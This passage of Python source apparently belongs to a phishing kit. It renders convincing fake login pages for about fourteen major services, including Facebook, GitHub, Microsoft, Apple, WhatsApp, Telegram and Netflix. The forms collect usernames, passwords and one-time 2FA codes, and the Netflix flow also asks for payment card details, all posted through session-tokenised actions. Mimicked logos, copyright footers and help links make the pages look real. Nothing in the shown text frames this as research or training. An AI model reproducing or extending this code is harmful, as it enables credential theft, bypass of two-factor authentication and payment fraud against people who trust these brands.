.fbox .in:focus+label,.fbox .in:not(:placeholder-shown)+label{top:0;font-size:12px;color:#1a73e8}
.fbox .in.code{letter-spacing:.3em;text-align:left}
.row{display:flex;justify-content:space-between;align-items:center;margin-top:40px}
.lk{color:#1a73e8;font-size:13.5px;font-weight:500}
.lk2{color:#1a73e8;font-size:14px;font-weight:600;padding:8px 6px}
.btn2{background:#1a73e8;color:#fff;border:0;border-radius:4px;height:36px;padding:0 24px;font-size:14px;
 font-weight:500;letter-spacing:.25px}
.btn2:active{background:#1765cc}
.chip{display:inline-flex;align-items:center;gap:8px;border:1px solid #dadce0;border-radius:20px;
 padding:2px 12px 2px 2px;font-size:14px;margin-bottom:18px}
.av{width:28px;height:28px;border-radius:50%;background:#1a73e8;color:#fff;display:flex;align-items:center;
 justify-content:center;font-size:14px;text-transform:uppercase}
.ft{padding:12px 24px;display:flex;gap:22px;font-size:12px;color:#5f6368;border-top:1px solid #dadce0;
 align-items:center}
.ft .sp{flex:1}.ft a{color:#5f6368}
.lang{border:0;background:none;font-size:12px;color:#5f6368;padding:0;width:auto;height:auto;outline:0}
.ctr{flex-direction:column;align-items:center;justify-content:center;padding:40px 16px}
.dfull{align-items:center;justify-content:center}
.card{width:448px;border:1px solid #dadce0;border-radius:8px;padding:48px 40px 36px}
"""
    return mob, desk, css, ""

def lay_yt(s, tok, step, ctx):
    ident = ctx.get("ident") or ""
    hh = "<input type='hidden' name='ident' value='" + html.escape(ident) + "'>" if ident else ""
    inner = (fld("login", s, tok, ctx) if step == "id" else
             "<p class='sm'>Enter the code sent to <b>" + html.escape(ident) + "</b></p>"
             "<input class='in code' name='otp' inputmode='numeric' maxlength='" + str(CFG["otp_len"]) +
             "' required autofocus>")
    form = ("<form method='post' " + act(tok, s["k"], step) + ">" + hid(tok, s["k"]) + hh + inner +
            "<button class='btn' type='submit'>Next</button></form>")
    body = ("<div class='top'><div style='display:flex;justify-content:center;margin-bottom:16px'>" +
            LOGO["youtube"] + "</div><div class='card'><h1>Sign in</h1>"
            "<p class='sm'>to continue to YouTube</p>" + form +
            "<div class='links'><a>Forgot password?</a><a>Create account</a></div></div>"
            "<div class='foot'>English (India) &middot; Help &middot; Privacy &middot; Terms</div></div>")
    css = """
body{background:#fff;color:#0f0f0f;font-family:Roboto,Arial,sans-serif}
.top{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:26px 18px}
.card{width:100%;max-width:448px;border:1px solid #dadce0;border-radius:8px;padding:36px 34px}
h1{font-size:24px;font-weight:400;margin-bottom:6px}
.sm{font-size:14px;color:#606060;margin-bottom:18px}
.in{height:52px;border:1px solid #dadce0;border-radius:4px;font-size:16px}
.in:focus{border:2px solid #065fd4;box-shadow:none}
.btn{background:#065fd4;border-radius:4px;height:38px;font-size:14px;font-weight:500;width:auto;padding:0 20px;
 float:right;margin-top:18px}
.links{display:flex;justify-content:space-between;clear:both;padding-top:26px;font-size:13px}
.links a{color:#065fd4;font-weight:500}
.foot{display:flex;gap:20px;justify-content:center;font-size:12px;color:#606060;padding:14px;
 border-top:1px solid #e5e5e5}
.dfull{justify-content:center;align-items:center}
"""
    return body, body, css, ""

def lay_fb(s, tok, step, ctx):
    ident = ctx.get("ident") or ""
    hh = "<input type='hidden' name='ident' value='" + html.escape(ident) + "'>" if ident else ""
    if step == "id":
        inner = ("<h2>Log into Facebook</h2>"
                 "<input class='in' name='ident' placeholder='Email address or phone number' required autofocus>"
                 "<input class='in' name='pw' type='password' placeholder='Password' required>"
                 "<button class='btn' type='submit'>Log in</button>"
                 "<div class='links' style='justify-content:center;gap:8px'><a>Forgot password?</a>"
                 "<span>&middot;</span><a>Forgot account?</a></div>"
                 "<div class='or'>or</div><a class='new'>Create new account</a>")
    else:
        inner = ("<h2>Enter login code</h2><p class='p'>We sent a %d-digit code for <b>%s</b></p>"
                 "<input class='in code' name='otp' inputmode='numeric' maxlength='%d' required autofocus>"
                 "<button class='btn' type='submit'>Continue</button>" % (CFG["otp_len"], html.escape(ident),
                                                                        CFG["otp_len"]))
    form = "<form method='post' " + act(tok, s["k"], step) + ">" + hid(tok, s["k"]) + hh + inner + "</form>"
    mob = ("<div class='bar'>" + FBL + "<span class='wd'>facebook</span></div><div class='w'>" + form + "</div>"
           "<div class='foot'>English (UK) &middot; à´®à´²à´¯à´¾à´³à´ &middot; à¤¹à¤¿à¤¨à¥à¤¦à¥ &middot; More languages<br><br>"
           "Meta &copy; 2026</div>")
    desk = ("<div class='dwrap'><div class='big'>facebook</div><div class='dcard'>" + form + "</div></div>"
            "<div class='foot'>Meta &middot; About &middot; Privacy &middot; Terms &middot; Cookies</div>")
    css = """
body{background:#f0f2f5;color:#1c1e21}
.bar{background:#1877f2;padding:10px 16px;display:flex;align-items:center;gap:9px}
.wd{color:#fff;font-size:20px;font-weight:700;letter-spacing:-.5px}
.w{max-width:396px;margin:0 auto;padding:22px 16px}
h2{font-size:17px;font-weight:400;text-align:center;margin-bottom:14px;color:#1c1e21}
.w .in{border-radius:6px;height:52px;font-size:16px;margin-bottom:10px;border-color:#dddfe2}
.w .btn{background:#1877f2;border-radius:6px;font-size:19px;font-weight:600}
.p{text-align:center;font-size:13px;color:#606770;margin-bottom:12px}
.or{display:flex;align-items:center;gap:14px;margin:18px 0;color:#96999e;font-size:13px}
.or:before,.or:after{content:'';flex:1;height:1px;background:#dadde1}
.new{display:block;width:fit-content;margin:0 auto;text-align:center;background:#42b72a;color:#fff;
 font-weight:700;border-radius:6px;padding:12px 22px;font-size:16px}
.dwrap{display:flex;gap:56px;align-items:center;justify-content:center;padding:60px 20px 0}
.dfull{align-items:center;justify-content:center}
.big{font-size:40px;font-weight:700;color:#1877f2;letter-spacing:-1.7px}
.dcard{width:396px;background:#fff;border-radius:8px;box-shadow:0 2px 4px #0000001a,0 8px 16px #0000001a;
 padding:20px 18px}
.dcard h2{display:none}.dcard .in{height:51px;font-size:15px}
.foot{text-align:center;font-size:11.5px;color:#8a8d91;padding:18px}
"""
    return mob, desk, css, ""

def lay_x(s, tok, step, ctx):
    ident = ctx.get("ident") or ""
    hh = "<input type='hidden' name='ident' value='" + html.escape(ident) + "'>" if ident else ""
    if step == "id":
        inner = ("<input class='in' name='ident' placeholder='Phone, email, or username' required autofocus>"
                 "<input class='in' name='pw' type='password' placeholder='Password' required>")
    elif step == "pw":
        inner = ("<p class='sm'>Signed in as <b>" + html.escape(ident) + "</b></p>"
                 "<input class='in' name='pw' type='password' placeholder='Password' required autofocus>")
    else:
        inner = ("<p class='sm'>Enter the %d-digit code sent to <b>%s</b></p>"
                 "<input class='in code' name='otp' inputmode='numeric' maxlength='%d' required autofocus>"
                 % (CFG["otp_len"], html.escape(ident), CFG["otp_len"]))
    form = ("<form method='post' " + act(tok, s["k"], step) + ">" + hid(tok, s["k"]) + hh + inner +
            "<button class='btn' type='submit'>" + ("Next" if step != "id" else "Log in") + "</button></form>"
            "<div class='links'><a>Forgot password?</a> &middot; <a>Sign up for X</a></div>")
    mob = "<div class='box'><div class='lg'>" + XLOGO + "</div><h1>Sign in to X</h1>" + form + "</div>"
    desk = "<div class='box'>" + form + "</div>"
    css = """
body{background:#000;color:#e7e9ea;font-family:'Segoe UI',Roboto,Arial,sans-serif}
.mob{padding:24px 18px}
.box{width:100%;max-width:364px}
.lg{margin-bottom:26px}h1{font-size:31px;font-weight:800;letter-spacing:-1px;margin-bottom:24px}
.in{height:56px;border:1px solid #333639;border-radius:4px;background:#000;color:#e7e9ea;font-size:16px;
 margin-bottom:10px}
.in:focus{border-color:#1d9bf0;box-shadow:none}
.btn{background:#eff3f4;color:#0f1419;border-radius:999px;height:44px;font-size:16px;font-weight:700;
 margin-top:14px}
.links{margin-top:18px;font-size:14px;color:#71767b}.links a{color:#1d9bf0}
.sm{font-size:14px;color:#71767b;margin-bottom:12px}.sm b{color:#e7e9ea}
.dfull{align-items:center;justify-content:center;padding:24px 18px}
"""
    return mob, desk, css, ""

def lay_tiktok(s, tok, step, ctx):
    ident = ctx.get("ident") or ""
    hh = "<input type='hidden' name='ident' value='" + html.escape(ident) + "'>" if ident else ""
    if step == "id":
        inner = (fld("login", s, tok, ctx))
    elif step == "pw":
        inner = ("<p class='sm'>" + html.escape(ident) + "</p>" + fld("pw", s, tok, ctx))
    else:
        inner = ("<p class='sm'>Enter the %d-digit code sent to you.</p>" % CFG["otp_len"] +
                 "<input class='in code' name='otp' inputmode='numeric' maxlength='" + str(CFG["otp_len"]) +
                 "' required autofocus>")
    form = ("<form method='post' " + act(tok, s["k"], step) + ">" + hid(tok, s["k"]) + hh + inner +
            "<button class='btn' type='submit'>Log in</button></form>"
            "<div class='alt'><a>Forgot password?</a><a>Sign up</a></div>")
    body = ("<div class='box'><div class='lg'>" + LOGO["tiktok"] + "</div>"
            "<h1>Log in to TikTok</h1><p class='sm'>Manage your account, check notifications, comment on videos "
            "and more.</p><div class='card'>" + form + "</div></div>")
    css = """
body{background:#000;color:#fff;font-family:'Segoe UI',Roboto,Arial,sans-serif}
.mob{padding:26px 18px}
.box{width:100%;max-width:400px}
.lg{display:flex;justify-content:center;margin-bottom:20px}
h1{font-size:26px;font-weight:700;text-align:center;margin-bottom:8px;letter-spacing:-.5px}
.sm{font-size:13px;color:#a1a1a1;text-align:center;line-height:1.6;margin-bottom:20px}
.card{background:#121212;border:1px solid #2a2a2a;border-radius:10px;padding:22px 18px}
.lbl{color:#a1a1a1}.in{background:#1c1c1c;border-color:#333;color:#fff;height:48px}
.in:focus{border-color:#fe2c55;box-shadow:none}
.btn{background:#fe2c55;border-radius:6px;height:48px;font-size:16px;font-weight:700}
.alt{display:flex;justify-content:space-between;margin-top:16px;font-size:13px}
.alt a{color:#fff;text-decoration:underline}
.dfull{align-items:center;justify-content:center;padding:26px 18px}
"""
    return body, body, css, ""

def lay_discord(s, tok, step, ctx):
    ident = ctx.get("ident") or ""
    hh = "<input type='hidden' name='ident' value='" + html.escape(ident) + "'>" if ident else ""
    inner = (fld("login", s, tok, ctx) if step == "id" else
             "<p class='sm'>" + html.escape(ident) + "</p>" + fld("pw", s, tok, ctx))
    form = ("<form method='post' " + act(tok, s["k"], step) + ">" + hid(tok, s["k"]) + hh + inner +
            "<button class='btn' type='submit'>Log In</button></form>"
            "<div class='links'><a>Forgot your password?</a><a>Need an account? Register</a></div>")
    body = ("<div class='box'><div class='card'><div class='lg'>" + LOGO["discord"] +
            "<b>Discord</b></div>"
            "<h1>Welcome back!</h1><p class='sm'>We're so excited to see you again!</p>" + form + "</div></div>")
    css = """
body{background:#313338;color:#f2f3f5;font-family:'gg sans','Segoe UI',Roboto,Arial,sans-serif}
.mob{padding:26px 18px}
.box{width:100%;max-width:420px}
.card{background:#313338;border-radius:5px;padding:26px 22px;box-shadow:0 2px 10px #0003}
.lg{display:flex;justify-content:center;align-items:center;gap:9px;margin-bottom:20px}
.lg b{font-size:20px;font-weight:800;color:#fff}
h1{font-size:24px;font-weight:600;text-align:center;margin-bottom:8px}
.sm{font-size:15px;color:#b5bac1;text-align:center;margin-bottom:20px}
.lbl{color:#b5bac1;text-transform:none;letter-spacing:0;font-size:12px}
.in{background:#1e1f22;border:0;border-radius:3px;height:40px;font-size:15px}
.in:focus{box-shadow:0 0 0 1px #5865f2}
.btn{background:#5865f2;border-radius:3px;height:44px;font-size:16px;font-weight:600;margin-top:18px}
.links{display:flex;flex-direction:column;gap:5px;margin-top:14px;font-size:13px}
.links a{color:#00a8fc}
.dfull{align-items:center;justify-content:center;padding:26px 18px}
"""
    return body, body, css, ""

def lay_reddit(s, tok, step, ctx):
    ident = ctx.get("ident") or ""
    hh = "<input type='hidden' name='ident' value='" + html.escape(ident) + "'>" if ident else ""
    inner = (fld("login", s, tok, ctx) if step == "id" else
             "<p class='sm'>" + html.escape(ident) + "</p>" + fld("pw", s, tok, ctx))
    form = ("<form method='post' " + act(tok, s["k"], step) + ">" + hid(tok, s["k"]) + hh + inner +
            "<button class='btn' type='submit'>Log In</button></form>"
            "<div class='links'><a>Forgot password?</a><a>Sign up</a></div>")
    body = ("<div class='box'><div class='lg'>" + LOGO["reddit"] + "</div><h1>Log in</h1>"
            "<p class='sm'>By continuing, you agree to our User Agreement and Privacy Policy.</p>"
            "<div class='card'>" + form + "</div></div>")
    css = """
body{background:#dae0e6;color:#1c1c1c;font-family:'IBM Plex Sans',-apple-system,'Segoe UI',Arial,sans-serif}
.mob{padding:26px 18px}
.box{width:100%;max-width:360px}
.lg{display:flex;justify-content:center;margin-bottom:14px}
h1{font-size:22px;font-weight:600;text-align:center;margin-bottom:6px}
.sm{font-size:12px;color:#576f76;text-align:center;line-height:1.6;margin-bottom:16px}
.card{background:#fff;border-radius:12px;padding:20px 16px}
.lbl{color:#576f76}.in{height:44px;border:1px solid #edeff1;border-radius:20px;background:#f6f7f8}
.in:focus{border-color:#0079d3;box-shadow:none}
.btn{background:#d93a00;border-radius:999px;height:42px;font-size:14px;font-weight:700}
.links{display:flex;justify-content:space-between;margin-top:14px;font-size:12px}
.links a{color:#0079d3;font-weight:600}
.dfull{align-items:center;justify-content:center;padding:26px 18px}
"""
    return body, body, css, ""

def lay_snap(s, tok, step, ctx):
    ident = ctx.get("ident") or ""
    hh = "<input type='hidden' name='ident' value='" + html.escape(ident) + "'>" if ident else ""
    inner = (fld("login", s, tok, ctx) if step == "id" else
             "<p class='sm'>" + html.escape(ident) + "</p>" + fld("pw", s, tok, ctx))
    form = ("<form method='post' " + act(tok, s["k"], step) + ">" + hid(tok, s["k"]) + hh + inner +
            "<button class='btn' type='submit'>Log In</button></form>"
            "<div class='links'><a>Forgot password?</a><a>Sign up</a></div>")
    body = ("<div class='box'><div class='lg'>" + LOGO["snapchat"] + "</div><h1>Log in to Snapchat</h1>"
            "<div class='card'>" + form + "</div></div>")
    css = """
body{background:#fffc00;color:#000;font-family:'Segoe UI',Arial,sans-serif}
.mob{padding:26px 18px}
.box{width:100%;max-width:370px;text-align:center}
.lg{display:flex;justify-content:center;margin-bottom:14px}
h1{font-size:22px;font-weight:700;margin-bottom:18px}
.card{background:#fff;border-radius:14px;padding:20px 16px;text-align:left;
 box-shadow:0 10px 30px #00000014}
.lbl{color:#5c5c5c}.in{height:46px;border:1px solid #e0e0e0;border-radius:10px}
.in:focus{border-color:#000;box-shadow:none}
.btn{background:#000;color:#fffc00;border-radius:999px;height:46px;font-size:15px;font-weight:700}
.links{display:flex;justify-content:space-between;margin-top:14px;font-size:12.5px}
.links a{color:#000;font-weight:600;text-decoration:underline}
.sm{font-size:13px;color:#5c5c5c;margin-bottom:10px}
.dfull{align-items:center;justify-content:center;padding:26px 18px}
"""
    return body, body, css, ""

def lay_li(s, tok, step, ctx):
    ident = ctx.get("ident") or ""
    hh = "<input type='hidden' name='ident' value='" + html.escape(ident) + "'>" if ident else ""
    if step == "id":
        inner = ("<input class='in' name='ident' placeholder='Email or phone number' required autofocus>"
                 "<input class='in' name='pw' type='password' placeholder='Password' required>")
    else:
        inner = ("<p class='sm'>Enter the code sent to <b>" + html.escape(ident) + "</b></p>"
                 "<input class='in code' name='otp' inputmode='numeric' maxlength='" + str(CFG["otp_len"]) +
                 "' required autofocus>")
    form = ("<form method='post' " + act(tok, s["k"], step) + ">" + hid(tok, s["k"]) + hh + inner +
            "<button class='btn' type='submit'>Sign in</button></form>"
            "<div class='or'>or</div><button class='alt' type='button'>Sign in with Apple</button>"
            "<p class='legal'>New to LinkedIn? <a>Join now</a></p>")
    mob = "<div class='top'>" + LINKEDIN + "</div><div class='w'><h1>Sign in</h1>" \
          "<p class='sm'>Stay updated on your professional world</p>" + form + "</div>"
    desk = "<div class='top'>" + LINKEDIN + "</div><div class='w card'>" + form + "</div>"
    css = """
body{background:#fff;color:#000000e6;font-family:-apple-system,'Segoe UI',Roboto,Arial,sans-serif}
.top{padding:22px 0 0;text-align:center}
.w{width:100%;max-width:400px;margin:0 auto;padding:24px 22px}
h1{font-size:32px;font-weight:600;letter-spacing:-.6px;margin-bottom:6px}
.sm{font-size:14px;color:#00000099;margin-bottom:20px}
.in{height:52px;border:1px solid #000000e6;border-radius:4px;margin-bottom:12px;font-size:15px}
.in:focus{box-shadow:0 0 0 1px #0a66c2;border-color:#0a66c2}
.btn{background:#0a66c2;color:#fff;border-radius:999px;height:52px;font-size:16px;font-weight:600}
.or{display:flex;align-items:center;gap:14px;margin:20px 0;color:#00000099;font-size:14px}
.or:before,.or:after{content:'';flex:1;height:1px;background:#00000026}
.alt{width:100%;height:52px;border:1px solid #000000e6;border-radius:999px;background:#fff;font-size:16px;
 font-weight:600}
.legal{font-size:12px;color:#00000099;text-align:center;margin-top:18px}.legal a{color:#0a66c2;font-weight:600}
.dfull{align-items:center;padding-top:10px;background:#f4f2ee}
.dfull .w.card{background:#fff;border-radius:8px;box-shadow:0 4px 12px #0000001f;margin-top:20px;padding:32px}
"""
    return mob, desk, css, ""

def lay_gh(s, tok, step, ctx):
    ident = ctx.get("ident") or ""
    hh = "<input type='hidden' name='ident' value='" + html.escape(ident) + "'>" if ident else ""
    if step == "id":
        inner = ("<label class='lbl'>Username or email address</label><input class='in' name='ident' required autofocus>"
                 "<div class='pw'><label class='lbl'>Password</label><a>Forgot password?</a></div>"
                 "<input class='in' name='pw' type='password' required>")
    else:
        inner = ("<p class='sm'>Enter the code sent to <b>" + html.escape(ident) + "</b></p>"
                 "<input class='in code' name='otp' inputmode='numeric' maxlength='" + str(CFG["otp_len"]) +
                 "' required autofocus>")
    form = ("<form method='post' " + act(tok, s["k"], step) + ">" + hid(tok, s["k"]) + hh + inner +
            "<button class='btn' type='submit'>Sign in</button></form>")
    mob = "<div class='top'>" + GH + "</div><div class='w'><h1>Sign in to GitHub</h1><div class='card'>" + \
          form + "</div><div class='alt'>New to GitHub? <a>Create an account</a></div>" \
          "<div class='fl'><a>Terms</a><a>Privacy</a><a>Docs</a><a>Contact GitHub Support</a></div></div>"
    desk = mob
    css = """
body{background:#0d1117;color:#e6edf3;font-size:14px;
 font-family:-apple-system,'Segoe UI',Helvetica,Arial,sans-serif}
.top{padding:22px 0 0;text-align:center}
.w{width:100%;max-width:340px;margin:0 auto;padding:22px 20px}
h1{font-size:24px;font-weight:300;text-align:center;margin-bottom:16px}
.card{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:16px}
.lbl{margin-top:0}.in{height:32px;background:#0d1117;border:1px solid #30363d;border-radius:6px;font-size:14px}
.in:focus{border-color:#58a6ff;box-shadow:0 0 0 3px #58a6ff33}
.pw{display:flex;justify-content:space-between;align-items:baseline;margin-top:12px}
.pw a{font-size:12px;color:#58a6ff}
.btn{height:32px;background:#238636;border-radius:6px;font-size:14px;font-weight:500;margin-top:16px}
.alt{margin-top:16px;border:1px solid #30363d;border-radius:6px;padding:14px;text-align:center;font-size:14px}
.alt a{color:#58a6ff}
.fl{display:flex;gap:14px;justify-content:center;flex-wrap:wrap;margin-top:26px;font-size:11.5px;color:#8b949e}
.fl a{color:#8b949e}
.sm{font-size:13px;color:#8b949e;margin-bottom:12px}
.dfull{align-items:center;padding-top:6px}
"""
    return mob, desk, css, ""

def lay_ms(s, tok, step, ctx):
    ident = ctx.get("ident") or ""
    hh = "<input type='hidden' name='ident' value='" + html.escape(ident) + "'>" if ident else ""
    if step == "id":
        inner = "<input class='in' name='ident' placeholder='Email, phone, or Skype' required autofocus>"
    elif step == "pw":
        inner = ("<p class='sm'>" + html.escape(ident) + "</p>"
                 "<input class='in' name='pw' type='password' placeholder='Password' required autofocus>")
    else:
        inner = ("<p class='sm'>Enter the code we sent to " + html.escape(ident) + "</p>"
                 "<input class='in code' name='otp' inputmode='numeric' maxlength='" + str(CFG["otp_len"]) +
                 "' required autofocus>")
    form = ("<form method='post' " + act(tok, s["k"], step) + ">" + hid(tok, s["k"]) + hh + inner +
            "<button class='btn' type='submit'>Next</button></form>"
            "<div class='links'><a>No account? Create one!</a></div>")
    body = ("<div class='w'><div class='lg'>" + MS + "</div><div class='card'><h1>Sign in</h1>" + form +
            "</div><div class='lf'>Terms of use &nbsp; Privacy &amp; cookies</div></div>")
    css = """
body{background:#fff;color:#1b1b1b;font-family:'Segoe UI',-apple-system,Roboto,Arial,sans-serif}
.w{width:100%;max-width:440px;margin:0 auto;padding:34px 24px}
.lg{margin-bottom:18px}h1{font-size:24px;font-weight:600;margin-bottom:18px}
.in{height:36px;border:0;border-bottom:1px solid #605e5c;border-radius:0;background:#fff;font-size:15px;
 margin-bottom:20px}
.in:focus{border-bottom:2px solid #0067b8;box-shadow:none}
.btn{min-width:108px;width:auto;height:32px;background:#0067b8;border-radius:0;font-size:15px;margin-top:0;
 float:right}
.links{margin-top:18px;font-size:14px;clear:both;padding-top:14px}.links a{color:#0067b8}
.sm{font-size:14px;color:#605e5c;margin-bottom:14px}
.lf{font-size:12px;color:#605e5c;margin-top:26px}
.dfull{align-items:center;justify-content:center}
.card{box-shadow:0 2px 6px #0000001a;padding:44px;border-radius:2px;border:1px solid #edebe9;width:100%}
"""
    return body, body, css, ""

def lay_apple(s, tok, step, ctx):
    ident = ctx.get("ident") or ""
    hh = "<input type='hidden' name='ident' value='" + html.escape(ident) + "'>" if ident else ""
    if step == "id":
        inner = ("<div class='grp'><input class='in' name='ident' placeholder='Email or phone number' "
                 "required autofocus><input class='in' name='pw' type='password' placeholder='Password' "
                 "required></div>")
    else:
        inner = ("<p class='sm'>Enter the verification code sent to " + html.escape(ident) + "</p>"
                 "<input class='in code' name='otp' inputmode='numeric' maxlength='" + str(CFG["otp_len"]) +
                 "' required autofocus>")
    form = ("<form method='post' " + act(tok, s["k"], step) + ">" + hid(tok, s["k"]) + hh + inner +
            "<button class='btn' type='submit'>" + ("Continue" if step != "id" else "Sign in") + "</button></form>"
            "<div class='links'><a>Forgot Apple ID or password?</a></div>"
            "<div class='links'><a>Create a new Apple ID</a></div>")
    body = ("<div class='w'><div style='display:flex;justify-content:center;margin-bottom:22px'>" + APPLE +
            "</div><h1>" + ("Sign in to iCloud" if s["k"] == "icloud" else "Sign in with Apple ID") +
            "</h1><p class='sm'>Use your Apple ID to continue</p>" + form + "</div>"
            "<div class='foot'>Copyright &copy; 2026 Apple Inc. All rights reserved.</div>")
    css = """
body{background:#f5f5f7;color:#1d1d1f;font-family:-apple-system,'Segoe UI',Roboto,sans-serif}
.w{width:100%;max-width:400px;margin:0 auto;padding:40px 22px}
h1{font-size:26px;font-weight:600;letter-spacing:-.4px;text-align:center;margin-bottom:8px}
.sm{font-size:14px;color:#6e6e73;text-align:center;margin-bottom:22px;line-height:1.6}
.grp{display:flex;flex-direction:column;border:1px solid #d2d2d7;border-radius:10px;overflow:hidden;
 background:#fff;margin-bottom:4px}
.grp .in{border:0;border-radius:0;margin:0;height:48px}
.grp .in+.in{border-top:1px solid #d2d2d7}
.grp .in:focus{box-shadow:inset 0 0 0 2px #0071e3;z-index:2}
.in{height:48px;border:1px solid #d2d2d7;border-radius:10px;background:#fff;margin-bottom:12px;font-size:16px}
.btn{background:#0071e3;border-radius:10px;height:46px;font-size:16px;font-weight:500;margin-top:12px}
.links{text-align:center;margin-top:16px;font-size:13.5px}.links a{color:#0071e3}
.foot{margin-top:auto;text-align:center;font-size:12px;color:#86868b;padding:20px}
.dfull{align-items:center;justify-content:center}
"""
    return body, body, css, ""

def lay_wa(s, tok, step, ctx):
    inner = ("<label class='lbl'>Phone number</label>"
             "<input class='in' name='ident' type='tel' placeholder='+91 98765 43210' required autofocus>"
             "<button class='btn' type='submit'>Next</button>" if step == "phone" else
             "<label class='lbl'>Verification code</label>"
             "<input class='in code' name='otp' inputmode='numeric' maxlength='" + str(CFG["otp_len"]) +
             "' required autofocus><button class='btn' type='submit'>Verify</button>")
    form = "<form method='post' " + act(tok, s["k"], step) + ">" + hid(tok, s["k"]) + inner + "</form>"
    body = ("<div class='top'>" + WAL + "<b>WhatsApp</b></div><div class='w'>"
            "<div class='qr'>QR code<br>scan with phone</div><h1>Log in to WhatsApp Web</h1>"
            "<p class='sm'>Or enter your phone number with country code</p><div class='card'>" + form +
            "</div></div><div class='foot'>WhatsApp &copy; 2026</div>")
    css = """
body{background:#f0f2f5;color:#41525d;font-family:'Segoe UI',-apple-system,Roboto,Arial,sans-serif}
.top{background:#fff;padding:13px 18px;display:flex;align-items:center;gap:9px;border-bottom:1px solid #e9edef;
 font-size:18px;font-weight:600}
.w{width:100%;max-width:440px;margin:0 auto;padding:30px 20px;text-align:center}
h1{font-size:26px;font-weight:400;margin:16px 0 6px}
.sm{font-size:13.5px;color:#8696a0;margin-bottom:20px}
.card{background:#fff;border-radius:8px;padding:20px 16px;box-shadow:0 1px 3px #0000001a;text-align:left}
.in{height:44px;border:1px solid #d1d7db;border-radius:6px;margin-bottom:14px}
.in:focus{border-color:#00a884;box-shadow:none}
.btn{background:#00a884;border-radius:6px;height:44px;font-size:15px;font-weight:600}
.qr{width:172px;height:172px;margin:0 auto 14px;background:#fff;border:1px solid #e9edef;border-radius:8px;
 display:flex;align-items:center;justify-content:center;font-size:11px;color:#8696a0;text-align:center}
.foot{margin-top:auto;text-align:center;font-size:12px;color:#8696a0;padding:16px}
.dfull{align-items:center;padding-top:10px}
.dfull .w{background:#fff;border-radius:12px;margin:26px auto;box-shadow:0 6px 26px #0b1a2a14}
"""
    return body, body, css, ""

def lay_tg(s, tok, step, ctx):
    inner = ("<label class='lbl'>Phone number</label><input class='in' name='ident' type='tel' "
             "placeholder='+91 98765 43210' required autofocus><button class='btn' type='submit'>Next</button>"
             if step == "phone" else
             "<label class='lbl'>Code</label><input class='in code' name='otp' inputmode='numeric' "
             "maxlength='" + str(CFG["otp_len"]) + "' required autofocus>"
             "<button class='btn' type='submit'>Sign in</button>")
    form = "<form method='post' " + act(tok, s["k"], step) + ">" + hid(tok, s["k"]) + inner + "</form>"
    body = ("<div class='box'>" + TGL + "<h1>Telegram Web</h1><p class='sm'>" +
            ("Enter your phone number to sign in" if step == "phone" else "Enter the code we sent you") +
            "</p><div class='card'>" + form + "</div><div class='foot'>Telegram &copy; 2026</div></div>")
    css = """
body{background:#0e1621;color:#e9edf2;font-family:-apple-system,'Segoe UI',Roboto,Arial,sans-serif}
.mob{padding:24px 18px}
.box{width:100%;max-width:380px;text-align:center}
h1{font-size:22px;font-weight:600;margin:18px 0 8px}
.sm{font-size:13.5px;color:#7c8b9e;margin-bottom:22px;line-height:1.7}
.card{background:#17212b;border-radius:12px;padding:20px;text-align:left}
.lbl{color:#7c8b9e}.in{height:46px;background:#0e1621;border:1px solid #24303c;border-radius:8px}
.in:focus{border-color:#2aabee;box-shadow:none}
.btn{background:#2aabee;border-radius:8px;height:46px;font-size:15px;font-weight:600}
.foot{font-size:11.5px;color:#5c6b7d;margin-top:16px}
.dfull{align-items:center;justify-content:center;padding:24px 18px}
"""
    return body, body, css, ""

def lay_netflix(s, tok, step, ctx):
    if step == "id":
        inner = ("<h1>Sign In</h1><input class='in' name='ident' placeholder='Email or phone number' "
                 "required autofocus><input class='in' name='pw' type='password' placeholder='Password' required>"
                 "<button class='btn' type='submit'>Sign In</button>"
                 "<div class='row'><label><input type='checkbox' checked> Remember me</label>"
                 "<a>Need help?</a></div>"
                 "<div class='or'>OR</div><button class='code2' type='button'>Use a Sign-In Code</button>"
                 "<a class='forg'>Forgot password?</a>"
                 "<div class='new'>New to Netflix? <a>Sign up now</a></div>"
                 "<p class='help'>This page is protected by Google reCAPTCHA to ensure you're not a bot. "
                 "<b>Learn more.</b></p>")
    elif step == "pw":
        inner = ("<h1>Sign In</h1><p class='help' style='margin:0 0 14px'>" + html.escape(ctx.get("ident") or "") +
                 "</p><input class='in' name='pw' type='password' placeholder='Password' required autofocus>"
                 "<button class='btn' type='submit'>Sign In</button>"
                 "<a class='forg'>Forgot password?</a>")
    elif step == "card":
        inner = ("<h1>Update payment</h1>" + fld("card", s, tok, ctx) +
                 "<button class='btn' type='submit'>Start membership</button>")
    else:
        inner = ("<h1>Enter code</h1><p class='help' style='margin:0 0 14px'>Enter the %d-digit code sent to your "
                 "phone.</p><input class='in code' name='otp' inputmode='numeric' maxlength='%d' required autofocus>"
                 "<button class='btn' type='submit'>Verify</button>" % (CFG["otp_len"], CFG["otp_len"]))
    form = "<form method='post' " + act(tok, s["k"], step) + ">" + hid(tok, s["k"]) + inner + "</form>"
    body = ("<div class='top'>" + NFLX + "</div><div class='card'>" + form + "</div>"
            "<div class='foot'><div><a>FAQ</a><a>Help Centre</a><a>Terms of Use</a><a>Privacy</a>"
            "<a>Cookie Preferences</a><a>Corporate Information</a></div>Netflix &copy; 2026</div>")
    css = """
body{background:#000;color:#fff;font-family:'Helvetica Neue',Helvetica,Arial,sans-serif}
.mob{background:linear-gradient(180deg,#000000e6,#000000b3),#000}
.top{padding:20px}
.card{width:100%;max-width:450px;margin:0 auto;background:#000000bf;border-radius:4px;padding:30px 24px 24px}
h1{font-size:32px;font-weight:700;margin-bottom:22px}
.in{height:50px;border:0;border-radius:4px;background:#333;color:#fff;margin-bottom:14px;font-size:16px}
.in:focus{background:#454545;border:0;box-shadow:none}
.btn{background:#e50914;border-radius:4px;height:48px;font-size:16px;font-weight:600}
.row{display:flex;justify-content:space-between;font-size:13px;color:#b3b3b3;margin-top:12px}
.or{text-align:center;font-size:13px;color:#8c8c8c;margin:18px 0 12px}
.code2{width:100%;height:48px;background:#ffffff1a;border-radius:4px;color:#fff;font-size:16px;font-weight:500}
.forg{display:block;text-align:center;margin-top:18px;font-size:14px;color:#fff}
.new{margin-top:24px;font-size:15px;color:#737373}.new a{color:#fff;font-weight:600}
.help{font-size:13px;color:#b3b3b3;margin-top:16px;line-height:1.7}.help b{color:#fff}
.foot{margin-top:auto;background:#000000bf;padding:20px;font-size:12px;color:#737373;text-align:center}
